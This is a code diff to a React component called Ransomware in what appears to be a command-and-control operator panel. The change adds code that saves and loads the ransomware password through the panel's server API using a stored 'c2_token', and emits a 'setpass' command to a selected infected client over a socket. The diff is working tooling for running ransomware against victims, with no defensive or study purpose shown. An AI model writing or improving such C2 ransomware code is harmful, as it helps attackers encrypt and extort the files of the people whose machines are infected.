@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import styled from 'styled-components';
 import { 
   FiShield, 
@@ -258,6 +258,21 @@ const StatusValue = styled.div`
 const Ransomware = ({ client, socket }) => {
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  // Load saved password status at mount
+  useEffect(() => {
+    (async () => {
+      try {
+        const token = localStorage.getItem('c2_token') || '';
+        const res = await fetch('/api/password', {
+          headers: token ? { Authorization: `Bearer ${token}` } : {}
+        });
+        const data = await res.json();
+        if (data && typeof data.password === 'string') {
+          setPassword(data.password);
+        }
+      } catch (e) {}
+    })();
+  }, []);
   const [encryptPath, setEncryptPath] = useState('');
   const [decryptPath, setDecryptPath] = useState('');
   const [encryptedFiles, setEncryptedFiles] = useState([]);
@@ -265,6 +280,17 @@ const Ransomware = ({ client, socket }) => {
   const handleSetPassword = () => {
     if (!client || !socket || !password.trim()) return;
 
+    // Save in server DB
+    fetch('/api/password', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        ...(localStorage.getItem('c2_token') ? { Authorization: `Bearer ${localStorage.getItem('c2_token')}` } : {})
+      },
+      body: JSON.stringify({ password })
+    }).catch(() => {});
+
+    // Send to client
     socket.emit('executeCommand', {
       clientId: client.id,
       command: `setpass ${password}`
